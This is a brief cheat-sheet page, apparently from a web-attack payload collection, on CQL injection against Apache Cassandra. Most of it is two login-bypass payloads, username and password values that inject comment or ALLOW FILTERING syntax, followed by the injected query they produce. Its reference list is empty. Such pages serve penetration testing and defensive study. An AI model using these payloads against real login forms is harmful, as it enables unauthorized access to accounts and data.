# Cassandra Injection

> Apache Cassandra is a free and open-source distributed wide column store NoSQL database management system

## Summary

* [Cassandra comment](#cassandra-comment)
* [Cassandra - Login Bypass](#cassandra---login-bypass)
  * [Login Bypass 0](#login-bypass-0)
  * [Login Bypass 1](#login-bypass-1)
* [References](#references) 

## Cassandra comment

```sql
/* Cassandra Comment */
```

## Cassandra - Login Bypass

### Login Bypass 0

```sql
username: admin' ALLOW FILTERING; %00
password: ANY
```

### Login Bypass 1

```sql
username: admin'/*
password: */and pass>'
```

The injection would look like the following SQL query

```sql
SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;
```

## References


